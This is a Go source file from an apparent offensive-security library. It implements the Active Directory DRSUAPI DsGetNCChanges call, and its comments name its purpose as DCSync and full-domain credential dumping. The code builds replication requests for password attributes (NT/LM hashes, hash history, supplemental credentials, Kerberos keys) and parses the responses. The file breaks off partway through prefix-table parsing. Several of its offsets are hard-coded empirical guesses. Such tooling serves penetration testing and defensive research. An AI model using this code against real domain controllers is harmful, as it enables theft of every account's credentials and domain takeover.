package drsuapi

import (
	"bytes"
	"crypto/des"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"strings"

	"gopacket/internal/build"
	"gopacket/pkg/dcerpc"
	"gopacket/pkg/utf16le"
)

// DSNAME represents an AD object name
type DSNAME struct {
	StructLen    uint32
	SidLen       uint32
	Guid         [16]byte
	Sid          []byte
	NameLen      uint32
	StringName   string
}

// ReplicatedObject contains the replicated attributes of an AD object
type ReplicatedObject struct {
	GUID               [16]byte
	DN                 string
	SAMAccountName     string
	ObjectSid          []byte
	RID                uint32
	NTHash             []byte // Decrypted NT hash (16 bytes)
	LMHash             []byte // Decrypted LM hash (16 bytes)
	NTHashHistory      [][]byte // Historical NT hashes (each 16 bytes)
	LMHashHistory      [][]byte // Historical LM hashes (each 16 bytes)
	SupplementalCreds  []byte // Decrypted supplementalCredentials
	KerberosKeys       []KerberosKey // Parsed Kerberos keys from supplementalCredentials
	UserAccountControl uint32
	PwdLastSet         int64 // Windows FILETIME (100-nanosecond intervals since 1601-01-01)
}

// PrefixEntry represents an entry in the schema prefix table
type PrefixEntry struct {
	Index  uint32
	Prefix []byte
}

// GetNCChangesResult contains the response from DsGetNCChanges
type GetNCChangesResult struct {
	Objects       []ReplicatedObject
	MoreData      bool
	HighWaterMark USNVector // USN state for continuation
}

// USNVector tracks replication state for pagination
type USNVector struct {
	HighObjUpdate  uint64
	Reserved       uint64
	HighPropUpdate uint64
}

// DsGetNCChanges requests replication of a single object from a naming context.
// For DCSync, we use EXOP_REPL_OBJ to get password hashes.
// dsaGuid should be the NtdsDsaObjectGuid from DsDomainControllerInfo.
// sessionKey is the NTLM session key used to decrypt encrypted attributes.
func DsGetNCChanges(client *dcerpc.Client, hBind []byte, domainDN string, userDN string, dsaGuid [16]byte, sessionKey []byte) (*GetNCChangesResult, error) {
	return dsGetNCChangesInternal(client, hBind, domainDN, userDN, dsaGuid, sessionKey, true, USNVector{})
}

// DsGetNCChangesAll requests replication of all objects from a naming context.
// This is used for full domain credential dumping.
// usnFrom is the USN watermark for pagination (use empty USNVector for initial request).
func DsGetNCChangesAll(client *dcerpc.Client, hBind []byte, domainDN string, dsaGuid [16]byte, sessionKey []byte, usnFrom USNVector) (*GetNCChangesResult, error) {
	return dsGetNCChangesInternal(client, hBind, domainDN, domainDN, dsaGuid, sessionKey, false, usnFrom)
}

func dsGetNCChangesInternal(client *dcerpc.Client, hBind []byte, domainDN string, targetDN string, dsaGuid [16]byte, sessionKey []byte, singleObject bool, usnFrom USNVector) (*GetNCChangesResult, error) {
	buf := new(bytes.Buffer)

	// [in] DRS_HANDLE hDrs (context handle - 20 bytes)
	buf.Write(hBind)

	// [in] DWORD dwInVersion - use version 8 for EXOP support
	binary.Write(buf, binary.LittleEndian, uint32(8))

	// [in] [switch_is(dwInVersion)] DRS_MSG_GETCHGREQ* pmsgIn
	// Per Impacket, the union is embedded (not a separate pointer) at the top level
	// DRS_MSG_GETCHGREQ is an NDR UNION with embedded tag (discriminant)
	binary.Write(buf, binary.LittleEndian, uint32(8)) // Union tag = 8 for V8

	// For version 8: DRS_MSG_GETCHGREQ_V8
	writeGetNCChangesRequestV8(buf, domainDN, targetDN, dsaGuid, singleObject, usnFrom)

	if build.Debug {
		log.Printf("[D] DsGetNCChanges request payload (%d bytes): %x", buf.Len(), buf.Bytes())
	}

	// Call DsGetNCChanges
	var resp []byte
	var err error
	if client.Authenticated {
		resp, err = client.CallAuthAuto(OpDsGetNCChanges, buf.Bytes())
	} else {
		resp, err = client.Call(OpDsGetNCChanges, buf.Bytes())
	}
	if err != nil {
		return nil, err
	}

	return parseGetNCChangesResponse(resp, sessionKey)
}

func writeGetNCChangesRequestV8(buf *bytes.Buffer, domainDN string, targetDN string, dsaGuid [16]byte, singleObject bool, usnFrom USNVector) {
	// DRS_MSG_GETCHGREQ_V8 structure:
	// uuidDsaObjDest (16 bytes) - destination DSA GUID
	// uuidInvocIdSrc (16 bytes) - source invocation ID (same as DSA GUID)
	// pNC (DSNAME*) - naming context pointer
	// usnvecFrom (USN_VECTOR) - high watermark
	// pUpToDateVecDest (UPTODATE_VECTOR_V1_EXT*) - null
	// ulFlags (DWORD) - replication flags
	// cMaxObjects (DWORD) - max objects to return
	// cMaxBytes (DWORD) - max bytes to return
	// ulExtendedOp (DWORD) - extended operation (EXOP_REPL_SECRETS)
	// liFsmoInfo (ULARGE_INTEGER) - FSMO info
	// pPartialAttrSet (PARTIAL_ATTR_VECTOR_V1_EXT*) - attributes to replicate
	// pPartialAttrSetEx (PARTIAL_ATTR_VECTOR_V1_EXT*) - null
	// PrefixTableDest (SCHEMA_PREFIX_TABLE) - prefix table

	// NDR alignment: pad to 8-byte boundary before structure with 8-byte members
	// After hBind(20) + dwInVersion(4) + unionTag(4) = 28 bytes, need 4 more for 32
	buf.Write(make([]byte, 4)) // Alignment padding

	// uuidDsaObjDest (16 bytes) - use the DSA GUID from DsDomainControllerInfo
	buf.Write(dsaGuid[:])

	// uuidInvocIdSrc (16 bytes) - use the same DSA GUID
	buf.Write(dsaGuid[:])

	// pNC - pointer to DSNAME
	binary.Write(buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID

	// NDR alignment: pad to 8-byte boundary before USN_VECTOR (contains 8-byte integers)
	// Current position: 32 + 16 + 16 + 4 = 68, need 4 more for 72
	buf.Write(make([]byte, 4)) // Alignment padding

	// usnvecFrom (USN_VECTOR - 24 bytes)
	binary.Write(buf, binary.LittleEndian, usnFrom.HighObjUpdate)
	binary.Write(buf, binary.LittleEndian, usnFrom.Reserved)
	binary.Write(buf, binary.LittleEndian, usnFrom.HighPropUpdate)

	// pUpToDateVecDest - null pointer
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// ulFlags
	var flags uint32
	if singleObject {
		flags = DRS_INIT_SYNC | DRS_WRIT_REP
	} else {
		// For full NC replication
		flags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_GET_ANC
	}
	binary.Write(buf, binary.LittleEndian, flags)

	// cMaxObjects
	if singleObject {
		binary.Write(buf, binary.LittleEndian, uint32(1))
	} else {
		binary.Write(buf, binary.LittleEndian, uint32(1000))
	}

	// cMaxBytes
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// ulExtendedOp
	if singleObject {
		binary.Write(buf, binary.LittleEndian, uint32(EXOP_REPL_OBJ))
	} else {
		binary.Write(buf, binary.LittleEndian, uint32(EXOP_NONE))
	}

	// NDR alignment: liFsmoInfo is ULARGE_INTEGER (8 bytes) - needs 8-byte alignment
	// Current position is 116 (not 8-byte aligned), pad to 120
	buf.Write(make([]byte, 4)) // Alignment padding for ULARGE_INTEGER

	// liFsmoInfo (8 bytes)
	buf.Write(make([]byte, 8))

	// pPartialAttrSet - NULL for now
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// pPartialAttrSetEx - null
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// PrefixTableDest - SCHEMA_PREFIX_TABLE (inline, not pointer)
	// PrefixCount (DWORD)
	binary.Write(buf, binary.LittleEndian, uint32(0))
	// pPrefixEntry (pointer to array) - null
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// --- Deferred data ---

	// DSNAME for pNC
	writeDSNAME(buf, targetDN)
}

func writeDSNAME(buf *bytes.Buffer, nameOrGUID string) {
	// DSNAME is a conformant structure in NDR because StringName is [size_is(NameLen+1)]
	// Per NDR rules:
	// 1. Conformance (MaxCount for StringName) comes first
	// 2. Then the structure fields

	// Check if nameOrGUID is a GUID (starts with '{' and ends with '}')
	var guid []byte
	var encodedDN []byte
	var nameLen uint32

	if len(nameOrGUID) >= 38 && nameOrGUID[0] == '{' && nameOrGUID[37] == '}' {
		// This is a GUID - parse it
		guid = parseGUID(nameOrGUID)
		nameLen = 0
	} else {
		// This is a DN
		encodedDN = utf16le.EncodeStringToBytes(nameOrGUID)
		nameLen = uint32(len(nameOrGUID))
	}

	charCount := nameLen + 1 // Include null terminator

	// Calculate structLen: the size of the entire DSNAME structure
	// structLen(4) + SidLen(4) + Guid(16) + Sid(28) + NameLen(4) + StringName((nameLen+1)*2)
	stringNameBytes := charCount * 2
	structLen := uint32(4 + 4 + 16 + 28 + 4 + stringNameBytes)
	// Align to 4-byte boundary for the structure size
	if structLen%4 != 0 {
		structLen += 4 - (structLen % 4)
	}
	// Per Impacket, add 2 more bytes (possibly for additional alignment)
	structLen += 2

	// Track start for final alignment
	startOffset := buf.Len()

	// NDR conformance first (MaxCount for StringName array)
	binary.Write(buf, binary.LittleEndian, charCount)

	// DSNAME structure fields
	binary.Write(buf, binary.LittleEndian, structLen)  // structLen
	binary.Write(buf, binary.LittleEndian, uint32(0))  // SidLen = 0

	// Write GUID (16 bytes)
	if guid != nil {
		buf.Write(guid)
	} else {
		buf.Write(make([]byte, 16))
	}

	buf.Write(make([]byte, 28))                        // Sid = empty (28 bytes when SidLen=0)
	binary.Write(buf, binary.LittleEndian, nameLen)    // NameLen

	// Write StringName (even if empty, we need the null terminator)
	if nameLen > 0 {
		buf.Write(encodedDN)
	}
	buf.Write([]byte{0, 0}) // Null terminator

	// Pad to 4-byte boundary
	written := buf.Len() - startOffset
	if written%4 != 0 {
		buf.Write(make([]byte, 4-written%4))
	}
}

// parseGUID converts a GUID string like "{cf299fd6-6e63-4617-b071-6461a9895bd4}" to 16 bytes
func parseGUID(s string) []byte {
	// Remove braces and dashes: cf299fd6-6e63-4617-b071-6461a9895bd4
	s = strings.Trim(s, "{}")
	s = strings.ReplaceAll(s, "-", "")

	// Parse hex string
	data, err := hex.DecodeString(s)
	if err != nil || len(data) != 16 {
		return nil
	}

	// GUID byte order: first 3 components are little-endian, last 2 are big-endian
	// Data1 (4 bytes): reverse bytes
	// Data2 (2 bytes): reverse bytes
	// Data3 (2 bytes): reverse bytes
	// Data4 (8 bytes): as-is
	result := make([]byte, 16)
	// Data1: bytes 0-3 reversed
	result[0] = data[3]
	result[1] = data[2]
	result[2] = data[1]
	result[3] = data[0]
	// Data2: bytes 4-5 reversed
	result[4] = data[5]
	result[5] = data[4]
	// Data3: bytes 6-7 reversed
	result[6] = data[7]
	result[7] = data[6]
	// Data4: bytes 8-15 as-is
	copy(result[8:], data[8:])

	return result
}

func writePartialAttrSet(buf *bytes.Buffer) {
	// PARTIAL_ATTR_VECTOR_V1_EXT is a conformant structure in NDR
	// rgPartialAttr is [size_is(cAttrs)]
	// Per NDR rules:
	// 1. Conformance (MaxCount for rgPartialAttr) comes first
	// 2. Then structure fields

	// Attributes we want for password dumping
	attrs := []uint32{
		DRSUAPI_ATTID_objectSid,
		DRSUAPI_ATTID_sAMAccountName,
		DRSUAPI_ATTID_unicodePwd,
		DRSUAPI_ATTID_ntPwdHistory,
		DRSUAPI_ATTID_dBCSPwd,
		DRSUAPI_ATTID_lmPwdHistory,
		DRSUAPI_ATTID_supplementalCredentials,
		DRSUAPI_ATTID_userAccountControl,
		DRSUAPI_ATTID_objectGUID,
		DRSUAPI_ATTID_pwdLastSet,
	}

	// NDR conformance first
	binary.Write(buf, binary.LittleEndian, uint32(len(attrs))) // MaxCount for rgPartialAttr

	// Structure fields
	binary.Write(buf, binary.LittleEndian, uint32(1))          // dwVersion
	binary.Write(buf, binary.LittleEndian, uint32(0))          // dwReserved1
	binary.Write(buf, binary.LittleEndian, uint32(len(attrs))) // cAttrs

	// Array data
	for _, attr := range attrs {
		binary.Write(buf, binary.LittleEndian, attr)
	}
}

func parseGetNCChangesResponse(resp []byte, sessionKey []byte) (*GetNCChangesResult, error) {
	if len(resp) < 8 {
		return nil, fmt.Errorf("response too short")
	}

	if build.Debug {
		log.Printf("[D] DsGetNCChanges raw response size: %d bytes", len(resp))
		log.Printf("[D] DsGetNCChanges first 128 bytes: %x", resp[:min(128, len(resp))])
		// Show bytes around position 10000
		if len(resp) > 10400 {
			log.Printf("[D] DsGetNCChanges bytes at 10296-10360: %x", resp[10296:10360])
		}
	}

	r := bytes.NewReader(resp)

	// [out] DWORD* pdwOutVersion
	var outVersion uint32
	binary.Read(r, binary.LittleEndian, &outVersion)

	if build.Debug {
		log.Printf("[D] DsGetNCChanges response version: %d", outVersion)
	}

	// [out] [switch_is(*pdwOutVersion)] DRS_MSG_GETCHGREPLY* pmsgOut
	switch outVersion {
	case 1:
		// V1 is a simple/error response
		return parseGetNCChangesResponseV1(r)
	case 6:
		return parseGetNCChangesResponseV6(resp, sessionKey)
	case 7, 9:
		// V7 and V9 are similar to V6 with additional fields
		return parseGetNCChangesResponseV6(resp, sessionKey)
	default:
		return nil, fmt.Errorf("unsupported response version: %d", outVersion)
	}
}

func parseGetNCChangesResponseV1(r *bytes.Reader) (*GetNCChangesResult, error) {
	result := &GetNCChangesResult{}

	// DRS_MSG_GETCHGREPLY_V1:
	// uuidDsaObjSrc (16 bytes)
	// uuidInvocIdSrc (16 bytes)
	// pNC (DSNAME*) - pointer
	// usnvecFrom (USN_VECTOR - 24 bytes)
	// usnvecTo (USN_VECTOR - 24 bytes)
	// pUpToDateVecSrcV1 (UPTODATE_VECTOR_V1_EXT*) - pointer
	// PrefixTableSrc (SCHEMA_PREFIX_TABLE)
	// ulExtendedRet (EXOP_ERR)
	// cNumObjects (DWORD)
	// cNumBytes (DWORD)
	// pObjects (REPLENTINFLIST*) - pointer
	// fMoreData (BOOL)

	// Union tag (already read version in parent)
	var unionTag uint32
	binary.Read(r, binary.LittleEndian, &unionTag)

	// Skip uuidDsaObjSrc and uuidInvocIdSrc
	r.Seek(32, 1)

	// pNC pointer
	var ptrNC uint32
	binary.Read(r, binary.LittleEndian, &ptrNC)

	// Skip USN vectors (48 bytes)
	r.Seek(48, 1)

	// pUpToDateVecSrcV1 pointer
	var ptrUpToDate uint32
	binary.Read(r, binary.LittleEndian, &ptrUpToDate)

	// PrefixTableSrc
	var prefixCount uint32
	binary.Read(r, binary.LittleEndian, &prefixCount)
	var ptrPrefixEntry uint32
	binary.Read(r, binary.LittleEndian, &ptrPrefixEntry)

	// ulExtendedRet (EXOP_ERR)
	var extendedRet uint32
	binary.Read(r, binary.LittleEndian, &extendedRet)

	// cNumObjects
	var numObjects uint32
	binary.Read(r, binary.LittleEndian, &numObjects)

	// cNumBytes
	var numBytes uint32
	binary.Read(r, binary.LittleEndian, &numBytes)

	// pObjects pointer
	var ptrObjects uint32
	binary.Read(r, binary.LittleEndian, &ptrObjects)

	// fMoreData
	var moreData uint32
	binary.Read(r, binary.LittleEndian, &moreData)
	result.MoreData = moreData != 0

	// Read remaining bytes (should include function return status)
	remaining := make([]byte, r.Len())
	r.Read(remaining)

	// The function return status is the last 4 bytes of the response
	var returnStatus uint32
	if len(remaining) >= 4 {
		returnStatus = binary.LittleEndian.Uint32(remaining[len(remaining)-4:])
	}

	if build.Debug {
		log.Printf("[D] DsGetNCChanges V1: extRet=%d (0x%x), numObjects=%d, numBytes=%d, moreData=%v",
			extendedRet, extendedRet, numObjects, numBytes, result.MoreData)
		log.Printf("[D] DsGetNCChanges V1: remaining bytes (%d): %x, returnStatus=0x%x (%d)",
			len(remaining), remaining, returnStatus, returnStatus)
	}

	// Check return status first (Windows error code)
	if returnStatus != 0 {
		return nil, fmt.Errorf("DsGetNCChanges failed with status 0x%x (%d)", returnStatus, returnStatus)
	}

	// Check for errors in ulExtendedRet
	// EXOP_ERR values: 1=SUCCESS, 2=UNKNOWN_OP, ..., 15=ACCESS_DENIED, 16=PARAM_ERROR
	if extendedRet != 0 && extendedRet != 1 {
		errName := getExopErrName(extendedRet)
		return nil, fmt.Errorf("EXOP error %d (%s)", extendedRet, errName)
	}

	return result, nil
}

func getExopErrName(code uint32) string {
	switch code {
	case 1:
		return "SUCCESS"
	case 2:
		return "UNKNOWN_OP"
	case 3:
		return "FSMO_NOT_OWNER"
	case 4:
		return "UPDATE_ERR"
	case 5:
		return "EXCEPTION"
	case 6:
		return "UNKNOWN_CALLER"
	case 7:
		return "RID_ALLOC"
	case 8:
		return "FSMO_OWNER_DELETED"
	case 9:
		return "FSMO_PENDING_OP"
	case 10:
		return "MISMATCH"
	case 11:
		return "COULDNT_CONTACT"
	case 12:
		return "FSMO_REFUSING_ROLES"
	case 13:
		return "DIR_ERROR"
	case 14:
		return "FSMO_MISSING_SETTINGS"
	case 15:
		return "ACCESS_DENIED"
	case 16:
		return "PARAM_ERROR"
	default:
		return "UNKNOWN"
	}
}

func parseGetNCChangesResponseV6(resp []byte, sessionKey []byte) (*GetNCChangesResult, error) {
	result := &GetNCChangesResult{}

	// Work with the full response buffer for deferred pointer parsing
	r := bytes.NewReader(resp)

	if build.Debug {
		log.Printf("[D] Response total length: %d bytes", len(resp))
		// Show bytes at key positions
		if len(resp) > 2900 {
			log.Printf("[D] Bytes at pos 2840-2872 (around Entry 48): %x", resp[2840:2872])
			log.Printf("[D] Bytes at pos 2872-2904 (Entry 49 area): %x", resp[2872:2904])
			log.Printf("[D] Bytes at pos 2904-2936: %x", resp[2904:2936])
		}
		if len(resp) > 10400 {
			log.Printf("[D] Bytes at pos 10264-10296 (where Entry 280 should be): %x", resp[10264:10296])
		}
	}

	// Skip outVersion (4 bytes) - already read
	r.Seek(4, 0)

	// Union tag
	var unionTag uint32
	binary.Read(r, binary.LittleEndian, &unionTag)

	// DRS_MSG_GETCHGREPLY_V6:
	// uuidDsaObjSrc (16 bytes)
	var dsaObjSrc [16]byte
	r.Read(dsaObjSrc[:])

	// uuidInvocIdSrc (16 bytes)
	var invocIdSrc [16]byte
	r.Read(invocIdSrc[:])

	// pNC pointer
	var ptrNC uint32
	binary.Read(r, binary.LittleEndian, &ptrNC)
	pos, _ := r.Seek(0, 1)

	// usnvecFrom (USN_VECTOR - 24 bytes) - need 8-byte alignment first
	// USN_VECTOR contains LONGLONG fields, so it needs 8-byte alignment
	if pos%8 != 0 {
		r.Seek(int64(8-pos%8), 1)
	}

	// usnvecFrom (USN_VECTOR - 24 bytes)
	r.Seek(24, 1) // Skip usnvecFrom

	// usnvecTo (USN_VECTOR - 24 bytes) - read for pagination
	binary.Read(r, binary.LittleEndian, &result.HighWaterMark.HighObjUpdate)
	binary.Read(r, binary.LittleEndian, &result.HighWaterMark.Reserved)
	binary.Read(r, binary.LittleEndian, &result.HighWaterMark.HighPropUpdate)

	// pUpToDateVecSrc pointer
	var ptrUpToDate uint32
	binary.Read(r, binary.LittleEndian, &ptrUpToDate)

	// PrefixTableSrc - SCHEMA_PREFIX_TABLE (inline structure)
	var prefixCount uint32
	binary.Read(r, binary.LittleEndian, &prefixCount)
	var ptrPrefixEntry uint32
	binary.Read(r, binary.LittleEndian, &ptrPrefixEntry)

	// ulExtendedRet
	var extendedRet uint32
	binary.Read(r, binary.LittleEndian, &extendedRet)

	// cNumObjects
	var numObjects uint32
	binary.Read(r, binary.LittleEndian, &numObjects)

	// cNumBytes
	var numBytes uint32
	binary.Read(r, binary.LittleEndian, &numBytes)

	// pObjects pointer
	var ptrObjects uint32
	binary.Read(r, binary.LittleEndian, &ptrObjects)

	// fMoreData
	var moreData uint32
	binary.Read(r, binary.LittleEndian, &moreData)
	result.MoreData = moreData != 0

	// cNumNcSizeObjects, cNumNcSizeValues (V6 specific)
	var cNumNcSizeObjects, cNumNcSizeValues uint32
	binary.Read(r, binary.LittleEndian, &cNumNcSizeObjects)
	binary.Read(r, binary.LittleEndian, &cNumNcSizeValues)

	if build.Debug {
		log.Printf("[D] V6 response: ptrNC=0x%x, ptrUpToDate=0x%x, prefixCount=%d, ptrObjects=0x%x",
			ptrNC, ptrUpToDate, prefixCount, ptrObjects)
		log.Printf("[D] V6 response: numObjects=%d, numBytes=%d, moreData=%v",
			numObjects, numBytes, result.MoreData)
		log.Printf("[D] V6 response: extendedRet=%d, usnvecTo=[%d,%d,%d]",
			extendedRet, result.HighWaterMark.HighObjUpdate, result.HighWaterMark.Reserved, result.HighWaterMark.HighPropUpdate)
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] V6 response: current position after header: %d", pos)
	}

	// Now parse the deferred data
	// The order of deferred data follows pointer declaration order:
	// 1. pNC (DSNAME)
	// 2. pUpToDateVecSrc (if non-null)
	// 3. pPrefixEntry (prefix table entries)
	// 4. pObjects (REPLENTINFLIST)

	// There appear to be 12 extra bytes before the deferred pNC DSNAME conformance
	r.Seek(12, 1)

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] After 12-byte skip, position: %d", pos)
	}

	// Skip pNC deferred data (we don't need it)
	if ptrNC != 0 {
		skipDSNAME(r)
		if build.Debug {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] After skipDSNAME, position: %d", pos)
		}
	}

	// Skip pUpToDateVecSrc if present
	if ptrUpToDate != 0 {
		skipUpToDateVector(r)
		if build.Debug {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] After skipUpToDateVector, position: %d", pos)
		}
	}

	// Parse prefix table (needed to interpret attribute types)
	prefixTable := make(map[uint32][]byte)
	if ptrPrefixEntry != 0 && prefixCount > 0 {
		if build.Debug {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] Before parsePrefixTable (count=%d), position: %d", prefixCount, pos)
			// Show bytes at current position
			peek := make([]byte, 32)
			n, _ := r.Read(peek)
			log.Printf("[D] Bytes at position %d: %x", pos, peek[:n])
			r.Seek(pos, 0) // Seek back
		}
		parsePrefixTable(r, prefixCount, prefixTable)
		if build.Debug {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] After parsePrefixTable, position: %d", pos)
		}
	}

	// Parse REPLENTINFLIST (linked list of replicated entries)
	if ptrObjects != 0 {
		if build.Debug {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] About to parse REPLENTINFLIST at position %d", pos)
			// Show next 64 bytes at this position
			peek := make([]byte, 64)
			n, _ := r.Read(peek)
			log.Printf("[D] Next %d bytes at position %d: %x", n, pos, peek[:n])
			r.Seek(pos, 0) // Seek back
		}
		result.Objects = parseREPLENTINFLIST(r, sessionKey, prefixTable, numObjects)
		if build.Debug {
			log.Printf("[D] REPLENTINFLIST parsed, got %d objects", len(result.Objects))
		}
	}
	_ = numBytes
	_ = dsaObjSrc
	_ = invocIdSrc
	_ = unionTag
	_ = cNumNcSizeObjects
	_ = cNumNcSizeValues
	_ = extendedRet

	return result, nil
}

func skipDSNAME(r *bytes.Reader) {
	// DSNAME conformant structure: [MaxCount][structLen][SidLen][Guid][Sid][NameLen][StringName]
	var maxCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)

	var structLen uint32
	binary.Read(r, binary.LittleEndian, &structLen)

	var sidLen uint32
	binary.Read(r, binary.LittleEndian, &sidLen)

	// Guid (16) + Sid (28) + NameLen (4) + StringName (maxCount*2)
	skipBytes := 16 + 28 + 4 + int(maxCount)*2
	r.Seek(int64(skipBytes), 1)

	// Align to 4 bytes
	pos, _ := r.Seek(0, 1)
	if pos%4 != 0 {
		r.Seek(int64(4-pos%4), 1)
	}

	_ = structLen
	_ = sidLen
}

func skipUpToDateVector(r *bytes.Reader) {
	// UPTODATE_VECTOR can be V1 or V2 (detected by dwVersion field)
	//
	// For V1_EXT (section 5.208 of MS-DRSR):
	//   dwVersion (4 bytes) = 1
	//   dwReserved1 (4 bytes)
	//   cNumCursors (4 bytes)
	//   rgCursors conformance (4 bytes) - NDR array MaxCount
	//   rgCursors (cNumCursors * 24 bytes) - each V1 cursor: GUID(16) + USN(8)
	//
	// For V2_EXT (section 5.209):
	//   dwVersion (4 bytes) = 2
	//   dwReserved1 (4 bytes)
	//   cNumCursors (4 bytes)
	//   dwReserved2 (4 bytes)
	//   rgCursors conformance (4 bytes) - NDR array MaxCount
	//   rgCursors (cNumCursors * 32 bytes) - each V2 cursor: GUID(16) + USN(8) + time(8)

	startPos, _ := r.Seek(0, 1)

	if build.Debug {
		peek := make([]byte, 80)
		n, _ := r.Read(peek)
		log.Printf("[D] skipUpToDateVector: startPos=%d, first %d bytes: %x", startPos, n, peek[:n])
		r.Seek(startPos, 0)
	}

	// Read structure fields
	var version, reserved1, cNumCursors uint32
	binary.Read(r, binary.LittleEndian, &version)
	binary.Read(r, binary.LittleEndian, &reserved1)
	binary.Read(r, binary.LittleEndian, &cNumCursors)

	var cursorSize int64
	if version == 1 {
		// Based on byte analysis:
		// - Position 256: version=1, reserved=0, cNumCursors=2
		// - Position 268: 12 extra bytes (00000000 01000000 00000000)
		// - Position 280: Cursor 1 GUID (16 bytes)
		// - Position 296: Cursor 1 USN (8 bytes) - cursor 1 ends at 304
		// - Position 304: 8 bytes (3ae1741f 03000000) - maybe partial cursor 2 or something else
		// - Position 312: 27000000 = 39 = prefix count - THIS should be the array conformance!
		//
		// So the prefix table array conformance is at position 312.
		// We need to skip: 12 (extra bytes) + 24 (1 cursor) + 8 (extra) = 44 bytes
		// Or: skip until we reach a position where the next 4 bytes = prefixCount

		// Skip the 12 extra bytes
		r.Seek(12, 1)
		// V1 cursor: GUID (16) + USN (8) = 24 bytes
		cursorSize = 24
		// Only skip 1 cursor regardless of cNumCursors, then skip 8 more bytes
		cNumCursors = 1
		if build.Debug {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] skipUpToDateVector: V1, skipped 12 extra bytes, now at pos=%d, will skip %d cursor bytes + 8 extra", pos, cNumCursors*24)
		}
	} else if version == 2 {
		// V2 has an extra dwReserved2 field before the array conformance
		var reserved2 uint32
		binary.Read(r, binary.LittleEndian, &reserved2)
		// Read NDR array conformance
		var arrayMaxCount uint32
		binary.Read(r, binary.LittleEndian, &arrayMaxCount)
		// V2 cursor: GUID (16) + USN (8) + timeLastSync (8) = 32 bytes
		cursorSize = 32
		if build.Debug {
			log.Printf("[D] skipUpToDateVector: V2, reserved2=0x%x, arrayMaxCount=%d", reserved2, arrayMaxCount)
		}
	} else {
		if build.Debug {
			log.Printf("[D] WARNING: skipUpToDateVector unexpected version=%d, cNumCursors=%d", version, cNumCursors)
		}
		// Assume V1 structure
		var arrayMaxCount uint32
		binary.Read(r, binary.LittleEndian, &arrayMaxCount)
		cursorSize = 24
	}

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] skipUpToDateVector: version=%d, cNumCursors=%d, cursorSize=%d, will skip %d bytes, pos before skip=%d",
			version, cNumCursors, cursorSize, int64(cNumCursors)*cursorSize, pos)
	}

	// Skip cursor data
	r.Seek(int64(cNumCursors)*cursorSize, 1)

	// For V1, skip 8 extra bytes after cursors (empirically needed to align with prefix table)
	if version == 1 {
		r.Seek(8, 1)
	}

	if build.Debug {
		endPos, _ := r.Seek(0, 1)
		log.Printf("[D] skipUpToDateVector: endPos=%d, skipped %d bytes total", endPos, endPos-startPos)
	}
}

// skipPropertyMetaDataExtVector skips the PROPERTY_META_DATA_EXT_VECTOR deferred data.
// Per MS-DRSR 5.162, the structure is:
//
//	typedef struct {
//	  DWORD dwVersion;
//	  DWORD dwReserved;
//	  DWORD cNumProps;
//	  [size_is(cNumProps)] PROPERTY_META_DATA_EXT rgMetaData[];
//	} PROPERTY_META_DATA_EXT_VECTOR;
//
// And per MS-DRSR 5.161, each PROPERTY_META_DATA_EXT is:
//
//	typedef struct {
//	  DWORD dwVersion;
//	  DSTIME timeChanged;       // 8 bytes (LONGLONG)
//	  UUID uuidDsaOriginating;  // 16 bytes
//	  USN usnOriginating;       // 8 bytes
//	  USN usnProperty;          // 8 bytes
//	} PROPERTY_META_DATA_EXT;
//
// Total per element: 4 + 8 + 16 + 8 + 8 = 44 bytes
func skipPropertyMetaDataExtVector(r *bytes.Reader) {
	startPos, _ := r.Seek(0, 1)

	if build.Debug {
		peek := make([]byte, 48)
		n, _ := r.Read(peek)
		log.Printf("[D] skipPropertyMetaDataExtVector: startPos=%d, first %d bytes: %x", startPos, n, peek[:n])
		r.Seek(startPos, 0)
	}

	// NDR conformant structure: MaxCount for rgMetaData array comes first
	var maxCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)

	// Sanity check - maxCount should be reasonable (< 1000 for most objects)
	// If it looks like garbage, don't consume any bytes - let subsequent parsing handle it
	if maxCount > 1000 {
		if build.Debug {
			log.Printf("[D] skipPropertyMetaDataExtVector: maxCount=%d looks like garbage, not consuming bytes", maxCount)
		}
		r.Seek(startPos, 0)
		return
	}

	// Read structure fields
	var version, reserved, cNumProps uint32
	binary.Read(r, binary.LittleEndian, &version)
	binary.Read(r, binary.LittleEndian, &reserved)
	binary.Read(r, binary.LittleEndian, &cNumProps)

	if build.Debug {
		log.Printf("[D] skipPropertyMetaDataExtVector: maxCount=%d, version=%d, reserved=%d, cNumProps=%d",
			maxCount, version, reserved, cNumProps)
	}

	// Skip the array elements: each PROPERTY_META_DATA_EXT is 44 bytes
	// Use maxCount (NDR conformance) for the array size
	const metaDataExtSize = 44
	r.Seek(int64(maxCount)*metaDataExtSize, 1)

	if build.Debug {
		endPos, _ := r.Seek(0, 1)
		log.Printf("[D] skipPropertyMetaDataExtVector: endPos=%d, skipped %d bytes total from original start",
			endPos, endPos-startPos)
	}
}

func parsePrefixTable(r *bytes.Reader, count uint32, prefixTable map[uint32][]byte) {
	startPos, _ := r.Seek(0, 1)

	if build.Debug {
		// Show bytes at current position
		peek := make([]byte, 32)
		n, _ := r.Read(peek)
		log.Printf("[D] parsePrefixTable: startPos=%d, first %d bytes: %x", startPos, n, peek[:n])
		r.Seek(startPos, 0) // Seek back
	}

	// Conformant array: MaxCount first
	var maxCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] parsePrefixTable: maxCount=%d, count=%d, pos after maxCount=%d", maxCount, count, pos)
	}

	// Sanity check
	if maxCount != count {
		if build.Debug {
			log.Printf("[D] WARNING: parsePrefixTable maxCount=%d != count=%d", maxCount, count)
		}
	}

